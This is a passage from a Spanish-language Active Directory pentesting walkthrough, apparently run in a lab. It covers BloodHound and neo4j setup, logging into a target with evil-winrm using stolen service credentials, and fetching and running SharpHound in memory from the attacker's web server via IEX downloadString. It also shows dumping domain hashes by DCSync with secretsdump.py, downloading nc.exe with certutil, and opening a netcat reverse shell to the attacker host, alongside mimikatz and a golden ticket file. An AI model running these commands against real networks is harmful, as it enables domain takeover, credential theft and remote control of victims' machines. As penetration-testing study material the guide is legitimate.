2022-08-29 00:37:32.908+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2022-08-29 00:37:33.581+0000 INFO  Bolt enabled on localhost:7687.
2022-08-29 00:37:35.443+0000 INFO  Remote interface available at http://localhost:7474/
2022-08-29 00:37:35.447+0000 INFO  id: E5E4170FB2B5031926DF364EA0F2E3A2328F42FB3668C664849789F7333EEBE7
2022-08-29 00:37:35.448+0000 INFO  name: system
2022-08-29 00:37:35.448+0000 INFO  creationDate: 2022-08-29T00:37:30.703Z
2022-08-29 00:37:35.448+0000 INFO  Started.
```

Ahora ejecutamos ```bloodhound```

```bash
┌──(root㉿kali)-[/AD]
└─ bloodhound &>/dev/null &
[1] 2631
```

En la misma terminal escribimos ```disown``` para que se convierta en un proceso padre:

```bash
┌──(root㉿kali)-[/AD]
└─ disown
```
Para configurar nuestro usuario y contraseña nos debemos ir a la siguiente dirección:

* http://localhost:7474

Ingresamos las credenciales por defecto neo4j:neo4j

![neo4jdefault](/images/neo4jdb.png)

Y cambiamos la contraseña:

![changepass](/images/newpassneo4j.png)

Una vez asignada la nueva contraseña, simplemente iniciamos sesión

![bloodhoundlogin](/images/bloodhoundlogin.png)

El fin de esta utilidad es enumerar información de todo el directorio activo y vías potenciales para convertirte en "Domain Admin". Para que funcione debemos subir un zip el cual lo obtendremos por medio de [SharpHound](https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1). Para este proceso necesitamos credenciales válidas y un servidor en python para subir el ```SharpHound``` a la máquina objetivo.

```bash
┌──(root㉿kali)-[/AD]
└─ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
┌──(root㉿kali)-[/AD]
└─ evil-winrm -u 'SVC_SQLservice' -p 'Password4' -i 10.1.1.35                        


Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_sqlservice\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.1.1.19/SharpHound.ps1')
*Evil-WinRM* PS C:\Users\svc_sqlservice\Documents> Invoke-BloodHound -CollectionMethod All
*Evil-WinRM* PS C:\Users\svc_sqlservice\Documents> dir


    Directorio: C:\Users\svc_sqlservice\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/28/2022   7:14 PM          12930 20220828191445_BloodHound.zip
-a----        8/28/2022   7:14 PM           9378 ODQyZDkwZGYtMGVmZS00ODZmLWE0NWMtNTEzZWY2MDY3YzE2.bin

*Evil-WinRM* PS C:\Users\svc_sqlservice\Documents> download 20220828191445_BloodHound.zip
Info: Downloading 20220828191445_BloodHound.zip to ./20220828191445_BloodHound.zip

                                                             
Info: Download successful!
```

Una vez descargada verificamos si se encuentra en nuestra máquina atacante:

```bash
┌──(root㉿kali)-[/AD]
└─ ls -l 20220828191445_BloodHound.zip 
-rw-r--r-- 1 root root 12930 Aug 28 21:26 20220828191445_BloodHound.zip
```

Y procedemos a subirla a ```bloodhound```:

![bloodhoundupload](/images/bloodhoundupload.png)

Seleccionamos el .zip en la carpeta en que lo guardamos y se cargará correctamente:

![bloodhoundupload2](/images/bloodhoundupload2.png)


Ahora podremos ver mucha información del directorio activo como por ejemplo:

* Buscar todos los administradores del dominio:

![findalldomainadmins](/images/findalldomainadmins.png)

* Listar todos los usuarios kerberoastable:

![kerberoastableaccounts](/images/listallkerberoastableaccounts.png)

* Buscar los usuarios del dominio en que puedo hacer un DCSync y que debo hacer para obtener el hash del usuario administrador:

![infomimikatz](/images/infomimikatz.png)

Para esto último (DCSync) otra forma de hacerlo es por medio de ```secretsdump.py``` (se pueden probar DLLs):

```bash
┌──(root㉿kali)-[/AD]
└─ secretsdump.py felipecorp.local/fcanales:Password1@10.1.1.32
```


## Otros

### Ejecución de Netcat


```bash
C:\Windows\Temp\test> certutil.exe -f -urlcache -split http://10.1.1.19/nc.exe nc.exe
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
****  En l�nea  ****

  0000  ...
  e800
CertUtil: -URLCache comando completado correctamente.

C:\Windows\Temp\test> dir
 El volumen de la unidad C no tiene etiqueta.
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
 El n�mero de serie del volumen es: 940F-BBC0


 Directorio de C:\Windows\Temp\test

28/08/2022  12:34    <DIR>          .
28/08/2022  12:34    <DIR>          ..
28/08/2022  10:55             1.429 golden.kirbi
28/08/2022  10:48         1.355.680 mimikatz.exe
28/08/2022  12:34            59.392 nc.exe
               3 archivos      1.416.501 bytes
               2 dirs  38.950.277.120 bytes libres

C:\Windows\Temp\test> nc.exe 10.1.1.19 4646 -e cmd.exe
```

```bash
┌──(root㉿kali)-[/AD]
└─ rlwrap nc -nlvp 4646
listening on [any] 4646 ...
connect to [10.1.1.19] from (UNKNOWN) [10.1.1.35] 57161
Microsoft Windows [Versi�n 10.0.14393]
(c) 2016 Microsoft Corporation. Todos los derechos reservados.
C:\Windows\Temp\test> 
```

### Conexión por RDP

```bash
┌──(root㉿kali)-[/AD]
└─  rdesktop -u "" -a 16 <host>
```

```bash
┌──(root㉿kali)-[/AD]
└─  rdesktop -u "" -p "" -a 16 <host>
```
